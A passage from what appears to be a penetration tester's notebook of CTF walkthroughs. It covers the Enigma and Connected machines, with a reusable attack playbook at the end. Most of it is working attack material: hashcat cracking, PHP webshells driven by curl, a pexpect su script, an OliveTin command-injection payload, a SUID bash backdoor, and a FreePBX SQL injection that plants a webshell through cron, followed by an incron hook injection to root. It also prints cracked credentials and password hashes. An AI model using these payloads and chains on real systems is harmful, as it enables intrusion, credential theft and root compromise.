admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

#### Step 3 — Crack the bcrypt Hashes

The `admin` hash cracks to `Ne3s4rtars78s` (matches the webmail password — confirmation). The `haris` hash needs cracking:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.txt
hashcat -m 3200 -a 0 haris.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `haris:bestfriends`

Note: `$2y$` is the OpenSTAManager bcrypt variant. `hashcat -m 3200` handles it. If using Python `bcrypt` library, replace `$2y$` with `$2b$` first.

#### Step 6 — Switch to haris User

**The problem:** SSH is publickey-only. `su haris` requires an interactive TTY. The webshell runs via PHP `system()` which is non-interactive. Piping `echo bestfriends | su - haris -c "id"` doesn't work because `su` reads directly from `/dev/tty`, not stdin.

**The solution: pexpect with PTY**

`pexpect` spawns a process with a pseudo-terminal (PTY), which makes `su` believe it has a real terminal attached.

**Write the exploit script to the target using base64:**
```bash
# On attacker machine, create the base64-encoded script
python3 -c "
import base64
script = '''import pexpect,time
c = pexpect.spawn(\"su - haris\")
c.expect(\"Password:\")
c.sendline(\"bestfriends\")
time.sleep(0.5)
c.sendline(\"cat /home/haris/user.txt\")
time.sleep(2)
print(c.before.decode())
'''
b64 = base64.b64encode(script.encode()).decode()
print(b64)
"
```

```bash
# Write it to the target via webshell
curl -s 'http://support_001.enigma.htb/shell.php?c=echo%20[B64]%20|%20base64%20-d%20>%20/tmp/su_haris.py'
```

**Execute it:**
```bash
curl -s --max-time 15 'http://support_001.enigma.htb/shell.php?c=python3%20/tmp/su_haris.py'
```

**Output:**
```
su: Authentication failure  # (if wrong password)
Password:
haris@enigma:~$
cat /home/haris/user.txt
b40580ce5470997f0fc05d0e64cde7f9
```

**Fourth credential pair (local):** `haris:bestfriends`
**user.txt flag:** `b40580ce5470997f0fc05d0e64cde7f9`

### Privilege Escalation: haris → root (CVE-2026-27626 — OliveTin Command Injection)

#### Step 1 — Discovery of OliveTin

**Check listening ports via webshell:**
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=ss%20-tlnp'
```

**Key finding:**
```
LISTEN 0   4096   127.0.0.1:1337   0.0.0.0:*
```

Port 1337 is bound to localhost only. This is **OliveTin** — a web dashboard that exposes predefined shell commands as buttons.

**Check process owner:**
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=ps%20aux%20|%20grep%20olive'
# root    1471  /usr/local/bin/OliveTin
```

OliveTin runs as **root**, meaning any command it executes runs with root privileges.

**Check OliveTin config:**
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=cat%20/etc/OliveTin/config.yaml'
```

#### Step 2 — Config Analysis

**Critical config section:**
```yaml
authRequireGuestsToLogin: false   # ← NO AUTHENTICATION REQUIRED

actions:
  - title: Backup Database
    id: backup_database
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password     # ← CRITICAL: password type bypasses shell safety check
      - name: db_name
        type: ascii_identifier
        default: production
```

**Three key vulnerabilities:**
1. `authRequireGuestsToLogin: false` — anyone on localhost can access the API
2. `type: password` — the `checkShellArgumentSafety()` function in OliveTin blocks `ascii_identifier`, `int`, etc. but **not** `password`, allowing shell metacharacters to pass through
3. `-p'{{ db_pass }}'` — the password is wrapped in single quotes; injecting a single quote breaks out of the string context

#### Step 3 — Injection Mechanism

The shell command executed is:
```bash
mysqldump -u backup_svc -p'USER_INPUT' production > /opt/backups/backup.sql
```

If `db_pass` = `x' ; cat /root/root.txt ; #`, the command becomes:
```bash
mysqldump -u backup_svc -p'x' ; cat /root/root.txt ; #' production > /opt/backups/backup.sql
```

Execution flow:
1. `mysqldump -u backup_svc -p'x'` — runs first, fails with "invalid password" but does NOT stop execution (no `set -e`)
2. `cat /root/root.txt ;` — runs next, outputs the root flag to stdout
3. `#' production > /opt/backups/backup.sql` — the `#` comments out the rest, syntax error is harmless

OliveTin captures stdout of the entire shell pipeline. The output of `cat /root/root.txt` appears in the JSON response `"output"` field.

#### Step 4 — Reachability Problem

`www-data` cannot connect to `127.0.0.1:1337`. Confirmed by timeout:
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=curl%20--connect-timeout%203%20http://127.0.0.1:1337/'
# (hangs until timeout, no response)
```

The curl MUST run from **haris** or **root** context.

#### Step 5 — Prepare the JSON Payload

**Create the injection payload file on the target:**
```bash
# Write via Python on the target (avoids shell quoting issues)
curl -s 'http://support_001.enigma.htb/shell.php?c=python3%20-c%20%22import%20json;open(%27/tmp/olive_payload.json%27,%27w%27).write(json.dumps(%7B%27actionId%27:%27backup_database%27,%27arguments%27:%5B%7B%27name%27:%27db_user%27,%27value%27:%27backup_svc%27%7D,%7B%27name%27:%27db_pass%27,%27value%27:%22x%27%20;%20cat%20/root/root.txt%20;%20%23%22%7D,%7B%27name%27:%27db_name%27,%27value%27:%27production%27%7D%5D%7D))%22'
```

**Verify the payload:**
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=cat%20/tmp/olive_payload.json'
```
```json
{"actionId": "backup_database", "arguments": [{"name": "db_user", "value": "backup_svc"}, {"name": "db_pass", "value": "x' ; cat /root/root.txt ; #"}, {"name": "db_name", "value": "production"}]}
```

#### Step 6 — Execute the Injection via pexpect (su haris → curl)

**Create the pexpect script that chains `su haris` → `curl OliveTin API`:**

```python
import pexpect, time, sys

# Spawn su with PTY
c = pexpect.spawn("su - haris")
c.expect("Password:")
c.sendline("bestfriends")
time.sleep(1)

# Now we are haris — call the OliveTin API
# The @ symbol tells curl to read data from file
c.sendline("curl -s -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait -H Content-Type:application/json -d @/tmp/olive_payload.json")
time.sleep(5)

# Read the output buffer — this includes the curl response
out = c.read_nonblocking(size=65536, timeout=5) if c.isalive() else b""
print(out.decode(errors="replace"))
```

**Write via webshell (base64 method):**
```bash
B64_SCRIPT="aW1wb3J0IHBleHBlY3QsdGltZSxzeXMKYz1wZXhwZWN0LnNwYXduKCJzdSAtIGhhcmlzIikKYy5leHBlY3QoIlBhc3N3b3JkOiIpCmMuc2VuZGxpbmUoImJlc3RmcmllbmRzIikKdGltZS5zbGVlcCgxKQpjLnNlbmRsaW5lKCJjdXJsIC1zIC1YIFBPU1QgaHR0cDovLzEyNy4wLjAuMToxMzM3L2FwaS9vbGl2ZXRpbi5hcGkudjEuT2xpdmVUaW5BcGlTZXJ2aWNlL1N0YXJ0QWN0aW9uQW5kV2FpdCAtSCBDb250ZW50LVR5cGU6YXBwbGljYXRpb24vanNvbiAtZCBAL3RtcC9vbGl2ZV9wYXlsb2FkLmpzb24iKQp0aW1lLnNsZWVwKDUpCm91dCA9IGMucmVhZF9ub25ibG9ja2luZyhzaXplPTY1NTM2LCB0aW1lb3V0PTUpIGlmIGMuaXNhbGl2ZSgpIGVsc2UgYiIiCnByaW50KG91dC5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikpCg=="

curl -s 'http://support_001.enigma.htb/shell.php?c=echo%20'$B64_SCRIPT'%20|%20base64%20-d%20>%20/tmp/pwn_olive.py'
```

**Execute the script (use --max-time to allow for curl + sleep):**
```bash
curl -s --max-time 30 'http://support_001.enigma.htb/shell.php?c=python3%20-u%20/tmp/pwn_olive.py'
```

#### Step 7 — Extract the Root Flag

**API response (excerpt from `root_final.txt`):**
```json
{"logEntry": {
  "datetimeStarted": "2026-07-09 17:05:49",
  "actionTitle": "Backup Database",
  "output": "mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]\nOR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]\nOR     mysqldump [OPTIONS] --all-databases [OPTIONS]\nFor more options, use mysqldump --help\nc24ccfd1e40e1571efc9b52f131b8cb6\n",
  "exitCode": 0,
  "user": "guest",
  ...
}}
```

**Root flag:** `c24ccfd1e40e1571efc9b52f131b8cb6`

The `"output"` field contains:
1. `mysqldump` usage/error message (from the broken command)
2. `c24ccfd1e40e1571efc9b52f131b8cb6` — the output of `cat /root/root.txt` (our injected command)
3. `exitCode: 0` — the overall shell exit code (the last command `# ...` is a comment, exit code propagates from `cat` which succeeded)

### Understanding Why www-data Cannot Reach 127.0.0.1:1337

Confirmed by diagnostic:
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=timeout%203%20bash%20-c%20%22cat%20<%20/dev/tcp/127.0.0.1/1337%22%202>&1;%20echo%20EXIT:%24?'
# EXIT:124  (timed out after 3 seconds)
```

The `OliveTin.service` systemd unit likely has:
```
PrivateNetwork=true
```
This creates a network namespace where only the OliveTin process itself can access its bound port. `www-data` and other processes cannot connect.

Alternative: `RestrictAddressFamilies=AF_UNIX` could block non-OliveTin processes. Regardless of the mechanism, the result is that `www-data` gets connection timeouts while `haris` can connect.

### Alternative Root Escalation (Not Used Here)

If the OliveTin API is unreachable from haris too, the writeup at `wither2rebirth.com` demonstrates creating a SUID bash copy:

```bash
# Install SUID bash
cmd="install -m 4755 /bin/bash /tmp/.bs"

# Trigger via OliveTin
curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"bindingId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'"'"' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
    {"name":"db_name","value":"production"}
  ]}'

# Execute SUID bash
/tmp/.bs -p
# whoami → root
```

The injection creates a SUID-root copy of `/bin/bash` which can be executed by any user, granting a root shell via `-p` (preserved privileges).

### Credentials Summary

| Account | Credential | Source | Context |
|---------|------------|--------|---------|
| kevin (webmail) | `Enigma2024!` | NFS PDF leak | IMAP/POP3 access |
| sarah (webmail) | `Enigma2024!` | Password reuse (onboarding default) | IMAP/POP3 access |
| admin (OpenSTAManager) | `Ne3s4rtars78s` | IMAP as sarah (internal IT email) | Web app admin panel |
| brollin (MySQL) | `Fri3nds@9099` | OpenSTAManager `config.inc.php` | Database access |
| haris (local user) | `bestfriends` | bcrypt hash crack of `zz_users` table | Local shell (su) |

### Flags

| Flag | Value | Method |
|------|-------|--------|
| user.txt (haris) | `b40580ce5470997f0fc05d0e64cde7f9` | `cat /home/haris/user.txt` after `su haris` via pexpect |
| root.txt (root) | `c24ccfd1e40e1571efc9b52f131b8cb6` | OliveTin command injection via gRPC-Web API |

### Timeline of Execution

1. NFS mount + PDF extract → 2 min
2. IMAP enumeration of kevin + sarah → 5 min
3. OpenSTAManager RCE (webshell deploy) → 5 min (including PoC setup)
4. MySQL hash extraction → 2 min
5. Hashcat bcrypt crack (bestfriends) → 1-2 min (fast hit in rockyou)
6. Pexpect script write + execute for `su haris` → 5 min (debugging the quote escaping)
7. OliveTin config analysis + payload preparation → 5 min
8. Shell injection via pexpect su → curl → API → flag extraction → 5 min

Total active time: **~30-40 min**

### Difficulties Encountered

| Problem | Root Cause | Solution |
|---------|------------|----------|
| ZIP injection unreliable for long commands | The `gen_payload2.py` command with base64 + piping often fails silently | Use shorter commands; for complex operations, deploy a persistent webshell first |
| `su` pipeline didn't work | `su` requires a TTY, piping via `echo pwd \| su` fails | Use `pexpect` which spawns a PTY |
| Writing multi-line Python scripts via webshell | Shell quoting conflicts (bash → URL-encoding → PHP system() → target bash) | Use `echo B64 \| base64 -d > file.py` to write scripts without special chars |
| `Content-Type: application/json` header in sendline | Single quotes inside a pexpect sendline that's already inside a Python string | Either escape meticulously, or omit the header (curl auto-detects JSON for `@file`...) |
| www-data can't reach OliveTin on 1337 | Systemd `RestrictAddressFamilies` or `NetworkNamespacePath` | Run the curl as haris (or root) via `su` |
| The `root_flag.txt` appeared as 404 login page | File was never created because curl inside pexpect wasn't outputting | Use `read_nonblocking()` instead of `expect(EOF)` to capture buffered output |

### Key Lessons

1. **NFS is always worth checking** — world-readable exports with `*` are common and often contain sensitive documents
2. **Corporate password reuse** — temporary onboarding passwords get reused across webmail, support portals, and even databases
3. **PHP ZIP injection attacks** — ZipArchive treats `/` as path separator but passes everything else raw into filenames, including shell metacharacters
4. **`su` from webshell** — needs a PTY; `pexpect` is the most reliable approach
5. **gRPC-Web services on localhost** — check `127.0.0.1:PORT` for unauthenticated admin panels; the `password` argument type in OliveTin bypasses safety checks
6. **CVE research is essential** — knowing the CVE number (CVE-2025-69212, CVE-2026-27626) allows you to find exact PoC code and exploit details

### Analogies & Reusable Patterns

**Pattern 1: NFS Anonymous Mount → Document Leak → Initial Creds**
- Always enumerate NFS first: `showmount -e <TARGET>`
- Export with `*` means world-readable, no authentication
- Mount with `sudo mount -t nfs -o vers=3,nolock <TARGET>:/path /mnt`
- PDFs are the most common document format; use `pdftotext` to extract text
- Look for onboarding docs, welcome letters, IT setup instructions

**Pattern 2: Mail Server Pivot (IMAP + Password Reuse)**
- Full mail stack (POP3/IMAP + TLS) on a server with HTTP/RPC services indicates a realistic corporate setup
- Default corporate passwords are shared across employees
- Use `curl --url "imaps://<TARGET>/INBOX/;MAILINDEX=1" --user "user:pass" -k` for IMAP — no browser needed
- Check all mailboxes: INBOX, Sent, Trash, Drafts
- After getting one user's creds, try the same password on other usernames

**Pattern 3: ZIP Filename Injection (CVE-2025-69212)**
- PHP's `ZipArchive::extractTo()` preserves filenames but splits on `/`
- The `/` constraint means: use `cd <dir>` to navigate without `/`, or base64-encode commands
- The injection point is `exec("openssl smime ... -in \"$file\"")` — break out of the string with `";CMD;echo "`
- Upload endpoint is NOT always the main `actions.php` — check plugin-specific endpoints like `/plugins/importFE_ZIP/actions.php`
- The HTTP 500 response is EXPECTED and confirms command execution (the XML parse error happens AFTER the shell command)

**Pattern 4: Pexpect for Interactive su via Non-Interactive Shell**
- PHP `system()`, `exec()`, `shell_exec()` all run commands without a TTY
- `su` refuses password on stdin (reads from `/dev/tty` directly)
- `pexpect.spawn("su - USER")` creates a PTY-backed process that `su` accepts as real terminal
- Workflow: `spawn()` → `expect("Password:")` → `sendline("PASSWORD")` → `sendline("COMMAND")` → `read_nonblocking()`
- Write the pexpect script via base64-encoded echo to avoid quoting hell
- Call `read_nonblocking(size=65536, timeout=5)` instead of `expect(EOF)` — it returns immediately available buffered data

**Pattern 5: OliveTin gRPC-Web API Injection (CVE-2026-27626)**
- OliveTin runs as root and listens on localhost only
- `authRequireGuestsToLogin: false` means the API is completely unauthenticated
- The `password` argument type bypasses shell safety checks — `ascii_identifier` blocks `;` and `'` but `password` does NOT
- Payload structure: `db_pass = x' ; INJECTED_COMMAND ; #`
- This breaks `-p'x' ; INJECTED_COMMAND ; #' db_name` — the `#` comments out the trailing syntax
- API endpoint: `POST /api/olivetin.api.v1.OliveTinApiService/StartActionAndWait` (gRPC-Web, but JSON over HTTP works)
- Response is JSON with `"logEntry"."output"` containing merged stdout+stderr
- To test injection: `db_pass = x' ; touch /tmp/pwned ; #` — check if `/tmp/pwned` appears

**Pattern 6: gRPC-Web API Mechanics**
- OliveTin uses gRPC-Web protocol but accepts standard POST with JSON Content-Type
- The JSON structure for `StartActionAndWait` must match the gRPC-Web expected schema:
  ```json
  {"actionId": "backup_database", "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; cmd ; #"},
    {"name": "db_name", "value": "production"}
  ]}
  ```
- The `actionId` may differ from the action `title` — check config.yaml for the `id` field
- You can also find available actions via `GET /api/ListActions` or the gRPC `GetDashboard` endpoint

**Pattern 7: PHP Webshell as FTP/Scripting Backend**
- Simple `<?php system($_GET[0]);?>` via one-liner
- All commands via URL-encoded GET: `http://target/shell.php?c=CMD`
- Use `--data-urlencode` with curl for clean command encoding: `curl -G 'http://target/shell.php' --data-urlencode 'c=id'`
- Filename injection allows placing shell in `/var/www/html/openstamanager/` (webroot)
- Long-running commands (≥10s) may time out; use background (`&`) or write to files

**Pattern 8: Data Exfiltration via Webshell**
- No reverse shell needed — write output to a web-accessible file and read via HTTP
- Standard: execute `CMD > /var/www/html/openstamanager/out.txt 2>&1`, then `curl http://target/out.txt`
- This works even if the command times out — partial output is captured

**Pattern 9: Full Attack Chain for Linux Mail/Hosting Servers**
- NFS → Document → Credentials
- IMAP → Password Reuse → More Credentials
- Web App → RCE → DB Access
- Database → Password Hashes → Crack → Local User
- Local Service (OliveTin) → Unauthenticated API → Command Injection → Root
- Every step builds on the previous; missing any single credential breaks the chain

---

## ENGAGEMENT 007 — Connected (Easy Linux)

### Target Profile
- **IP:** 10.129.52.169
- **OS:** Sangoma Linux 7 (CentOS 7, kernel 3.10.x)
- **HTB VPN Tun IP (attacker):** 10.10.15.184
- **Key Ports:** 22 (SSH OpenSSH 7.4), 80 (HTTP Apache 2.4.6), 443 (HTTPS Apache 2.4.6 + PHP 7.4.16)
- **Stack:** FreePBX 16.0.40.7, Asterisk PBX, MariaDB 5.5.65, Apache 2.4.6, mod_ssl, PHP 7.4.16
- **Domains:** `connected.htb` (vhost), `pbxconnect` (SSL CN)
- **Difficulty:** Easy
- **Tags:** `freepbx` `cve-2025-57819` `sqli` `cron-jobs` `php-webshell` `incron` `sysadmin-manager` `gpg` `command-injection` `warm-param`

### Tools Required

| Tool | Purpose | Installation |
|------|---------|-------------|
| `nmap` | Port scanning | `apt install nmap` |
| `curl` | HTTP requests, SQLi, webshell | Built-in |
| `python3` | URL encoding, payload generation | Built-in |
| `hashcat` | bcrypt password cracking | `apt install hashcat` |

### Vulnerability 1: CVE-2025-57819 (FreePBX Endpoint Module Unauthenticated SQLi)

- **Type:** Stacked-query SQL injection in `brand` parameter of Endpoint Manager AJAX handler
- **Endpoint:** `GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<PAYLOAD>`
- **Auth:** None required — unauthenticated
- **Root cause:** The `brand` parameter is concatenated directly into a SQL SELECT statement without sanitization. MariaDB 5.5.x supports stacked queries (multiple statements separated by `;`), enabling INSERT/UPDATE/DELETE operations through the same injection point.

### Vulnerability 2: sysadmin_manager Hook Injection via Valid GPG + $warm

- **Type:** Command injection in backup module's `perform-backup` hook
- **Escalation:** asterisk (uid=999) → root via incron-triggered `sysadmin_manager`
- **Root cause:** The hook at `backup/hooks/perform-backup` takes user-controlled `$warm` parameter and concatenates it directly into `exec()` without escaping

### Attack Chain (Overview)

```
Unauthenticated SQLi (CVE-2025-57819)
  └── Stacked INSERT into cron_jobs table
        └── Cron fires (~60-90s) → writes PHP webshell to webroot
              └── RCE as asterisk (uid=999)
                    └── Privilege Escalation:
                          ├── incron: system root watcher on /var/spool/asterisk/incron
                          │     └── sysadmin_manager runs as root on file create
                          ├── GPG audit: backup module has VALID GPG signature
                          │     ├── UCP module: NO_PUBKEY (key not in keyring) ✗
                          │     ├── sysadmin module: BADSIG (tampered) ✗
                          │     └── backup module: GOODSIG + VALIDSIG ✓
                          ├── backup hooks/perform-backup has $warm injection
                          ├── Craft base64(gz(json)) payload with ;cmd in $warm slot
                          ├── Create incron trigger: backup.perform-backup.<encoded>
                          └── incron → sysadmin_manager (root) → hook → cmd as ROOT
```

### Phase 1 — Reconnaissance

#### Step 1 — Port Scan
```bash
nmap -p- --min-rate 5000 -Pn 10.129.52.169
```
Three ports open: 22 (SSH), 80 (HTTP → redirects to `connected.htb`), 443 (HTTPS → FreePBX).

#### Step 2 — Web Enumeration
```bash
echo "10.129.52.169 connected.htb" | sudo tee -a /etc/hosts
curl -s http://connected.htb/admin/ | grep -i "freepbx\|version"
# FreePBX 16.0.40.7
```

#### Step 3 — Confirm SQLi

```bash
curl -s -H "Host: connected.htb" \
  "http://10.129.52.169/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20DATABASE()),0x7e))--%20-"
```
Response confirms database `asterisk`, MariaDB 5.5.65 (stacked queries supported).

### Phase 2 — Initial Access: SQLi → Cron → Webshell

#### Step 1 — Stacked INSERT Into cron_jobs Table

```sql
x' ;INSERT INTO cron_jobs
  (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES
  ('sysadmin', 'webshell',
   'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d >/var/www/html/shell.php',
   NULL, '* * * * *', 30, 1, 1) -- -
```

```bash
PAYLOAD="x'%3BINSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','webshell','echo+PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64+-d+>/var/www/html/shell.php',NULL,'*+*+*+*+*',30,1,1)--+-"
curl -s -H "Host: connected.htb" \
  "http://10.129.52.169/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=${PAYLOAD}"
```
Success indicator: `Whoops` PHP notice in JSON response.

#### Step 2 — Wait for Cron Firing (~60-90s)

```bash
for i in $(seq 1 12); do
  sleep 10
  RESULT=$(curl -s -H "Host: connected.htb" "http://10.129.52.169/shell.php?cmd=id" --max-time 5)
  if echo "$RESULT" | grep -q "uid="; then echo "[+] $RESULT"; break; fi
done
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

### Phase 3 — Privilege Escalation: asterisk → root

#### Step 1 — Discover incron

```bash
curl -s -H "Host: connected.htb" "http://10.129.52.169/shell.php?cmd=cat%20/etc/incron.d/sysadmin"
# /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

System incron runs `sysadmin_manager` as **root** on file create. Also check user incrontab:

```bash
curl -s -H "Host: connected.htb" "http://10.129.52.169/shell.php?cmd=incrontab%20-l"
# /var/spool/asterisk/incron ... fwconsole-commands $#
# /tmp IN_MODIFY,... /bin/bash /tmp/exploit.sh $#
```

The `/tmp` incron runs `exploit.sh` as asterisk — causes race condition later.

#### Step 2 — Analyse sysadmin_manager

Trigger filename format: `<module>.<hook_name>.<params>`
```
backup.perform-backup.eJyLVipJLS5R0lFQ...
│      │              │
│      │              └── $params (3rd+ dot-segments, base64 payload)
│      └── hook name
└── module name
```

Regex in sysadmin_manager:
```php
preg_match('/^([\w_]+)\.([\w-]+)(?:\.(.+))?$/', $request, $parts);
// $parts[1] = module (e.g., "backup")
// $parts[2] = hook   (e.g., "perform-backup")
// $parts[3] = params (rest after 2nd dot)
```

Processing flow:
1. `$module` = `backup`, `$hook` = `perform-backup`, `$params` = `<base64>`
2. `$sigfile` = `...modules/backup/module.sig`
3. `$hookfile` = `...modules/backup/hooks/perform-backup`
4. GPG verify: `gpg ... --decrypt $sigfile` — checks for `GOODSIG` + `VALIDSIG`
5. SHA256 verify: `sha256sum $hookfile` must match decrypted module.sig hash
6. Execute: `system("$hookfile $params")` as root

#### Step 3 — Audit GPG Signatures

```bash
curl -s -H "Host: connected.htb" \
  "http://10.129.52.169/shell.php?cmd=for%20m%20in%20/var/www/html/admin/modules/*/module.sig;%20do%20echo%20%22%24m%22;%20gpg%20--homedir%20/home/asterisk/.gnupg/%20--status-file%20/tmp/s%20--output%20/tmp/o%20--decrypt%20%22%24m%22%202>/dev/null;%20grep%20-E%20%22(GOODSIG|BADSIG|NO_PUBKEY|VALIDSIG)%22%20/tmp/s%202>/dev/null;%20echo;%20done"
```

| Module | GPG Result | Valid? |
|--------|-----------|--------|
| `ucp` | `NO_PUBKEY` (key not in keyring) | ✗ |
| `sysadmin` | `BADSIG` (tampered) | ✗ |
| **`backup`** | **`GOODSIG` + `VALIDSIG`** | **✓** |

The backup module uses key `B53D215A755231A3` which IS in the GPG keyring.

#### Step 4 — Verify Hook Injection

```bash
curl -s -H "Host: connected.htb" \
  "http://10.129.52.169/shell.php?cmd=cat%20/var/www/html/admin/modules/backup/hooks/perform-backup"
```

```php
$command = '/usr/sbin/fwconsole backup --backup=' . escapeshellarg($buid) . '' . $warm
         . ' --transaction=' . escapeshellarg($jobid) . ' >> '.$location.'/backup_'.$jobid
         . '_out.log 2> '.$location.'/backup_'.$jobid.'_err.log & echo $!';
exec($command);
```

Key: `$buid` is escaped, `$warm` is **NOT** — direct injection into `exec()`.

#### Step 5 — Craft Payload

```php
$settings = [
    0 => $buid,      // backup name/id
    1 => $txn_id,    // transaction ID
    2 => $jobid,     // job ID
    3 => $location,  // output path (also unescaped but less useful)
    4 => $warm       // INJECTION POINT: ;cmd #
];
```

Python encoder:
```python
import json, zlib, base64

settings = ["test", "", "test", "/var/www/html",
            ";cat /root/root.txt > /var/www/html/flag.txt #"]
encoded = base64.urlsafe_b64encode(
    zlib.compress(json.dumps(settings).encode())
).decode().replace('-', '+')
trigger_name = f"backup.perform-backup.{encoded}"
```

The hook decodes: `str_replace('_', '/', $argv[1])` then `base64_decode(gzuncompress(...))`.

#### Step 6 — Write Trigger (Avoid /tmp Race)

```python
path_b64 = base64.b64encode(
    f"/var/spool/asterisk/incron/{trigger_name}".encode()
).decode()
g(f"php -r 'file_put_contents(base64_decode(\"{path_b64}\"),\"1\");'")
```

The `/tmp` incron runs `exploit.sh` on file create, which overwrites SUID binaries:
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash          # Overwrites root's version as asterisk
chmod 4755 /tmp/rootbash            # SUID but owned by asterisk
chown root:root /tmp/rootbash       # FAILS (EPERM)
```
**Solution:** Write to `/var/www/html/` instead of `/tmp`.

#### Step 7 — Capture Root Flag

```python
# Wait for sysadmin_manager (root) to process trigger
time.sleep(5)
r = g("cat /var/www/html/flag.txt 2>&1")
# a8da0d0311371a1eec1db9c76a34c18e
```

### Mistakes & Course Corrections

| Mistake | What Went Wrong | How I Found the Right Path |
|---------|----------------|----------------------------|
| **1. Assumed SHA256-only validation** | Tried backdooring UCP hook + patching module.sig hash (standard CTF approach). But the actual sysadmin_manager enforced GPG verification — it checks for `GOODSIG` + `VALIDSIG` in `gpg --status-file` output, not just SHA256. The UCP module.sig was signed with a key not in the keyring (`NO_PUBKEY`). | Ran `gpg --decrypt --status-file` on every module.sig. Found only backup module produces `GOODSIG` + `VALIDSIG`. |
| **2. Didn't audit ALL modules** | Focused only on UCP because it's the most common privesc target in FreePBX writeups. | Systematically looped over all `modules/*/module.sig` files with GPG status output. Discovered backup module was the only one with a valid signature. |
| **3. URL double-encoding** | Used `urllib.parse.quote(cmd)` then passed to `requests.get(params={'c': quoted_cmd})`. The `requests` library URL-encoded again, causing `+` → `%2B` → decoded as `%2B` (not `+`) in PHP. | Noticed base64 payload had `+` chars that were being corrupted. Checked actual HTTP request with `requests` debugging, saw `%252B` instead of `%2B`. |
| **4. Trusting the /tmp incron** | Tried creating SUID rootbash via `$warm` injection with `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; chown root:root /tmp/rootbash`. Root incron created it, but the user /tmp incron immediately ran exploit.sh, overwriting as asterisk. | Read the user incrontab and `cat /tmp/exploit.sh`. Realised the race condition — /tmp incron fires on any file create/close in /tmp. |
| **5. Using `base64.urlsafe_b64encode()` without adjusting `-`** | URL-safe base64 replaces `+` with `-` and `/` with `_`. The hook only does `str_replace('_', '/', ...)` — it replaces `_` back to `/` but leaves `-` as-is (which is not valid base64). | Tested PHP decode on the target: `php -r "print_r(json_decode(gzuncompress(base64_decode(\"...\")),true));"`. Got `false` for undecodable strings. Fixed by replacing `-` back to `+` after encoding. |
| **6. Writing trigger files with echo** | Trying `echo '1' > /var/spool/asterisk/incron/backup...` — shell quoting issues with special chars in the filename. | Switched to `php -r 'file_put_contents(base64_decode("..."), "1");'` which avoids all shell interpretation of the filename. |
| **7. Chose complex SUID payload first** | Tried full SUID bash creation for first exploit test. Failed due to race condition and URL encoding simultaneously — couldn't isolate the issue. | Simplified to `;id > /var/www/html/pwned #`. When that worked, progressively added complexity until identifying the /tmp race condition. |
| **8. Base64 padding loop for / avoidance** | Used a padding loop to find a JSON payload without `+` or `/` in its base64 — worked but was overcomplicated. | Realised the hook uses `str_replace('_', '/', ...)` so `_` in filename is valid. URL-safe base64 naturally uses `_` instead of `/`, and `+` is handled by proper URL encoding. |

### Key Lessons

1. **GPG verification is stronger than SHA256-only** — Some modules have real GPG-signed module.sig files. Check for `GOODSIG` + `VALIDSIG`, not just exit code.
2. **Audit EVERY module systematically** — Loop over all modules. The one with valid GPG might not be the obvious one.
3. **URL encoding hygiene** — Never double-encode HTTP params. Let the HTTP library handle encoding.
4. **Incron race conditions matter** — User incron on /tmp can overwrite root-created files. Watch for conflicting incrontabs.
5. **Test incrementally** — Start with the minimal injection (`;id > path #`), then escalate complexity.
6. **The `$warm` unescaped concat** — `$buid` and `$jobid` use `escapeshellarg()`, but `$warm` is raw concatenation.

### Analogies & Reusable Patterns

**Pattern 1: GPG Signature Audit for Hook Exploitation**
- Not all module signatures are equal — check each module individually
- Parse `gpg --status-file` output: look for `GOODSIG` + `VALIDSIG`
- `NO_PUBKEY` = signing key absent → fail. `BADSIG` = tampered → fail
- Find module with valid GPG + exploitable hook code

**Pattern 2: incron Trigger Format as Structured Input Channel**
- Filename format: `<module>.<hook>.<params>` — params is arbitrary user data
- sysadmin_manager passes `params` as `$argv[1]` to the hook script
- Base64(gz(json)) is used for structured data — decoding happens in the hook, not sysadmin_manager

**Pattern 3: URL Encoding Hygiene for Webshells**
- `requests.get(url, params={'c': cmd})` URL-encodes `cmd` properly
- Pre-encoding causes double-encoding: `+` → `%2B` in original, then `%252B` in actual request
- Test with strings containing `+` to verify encoding is correct

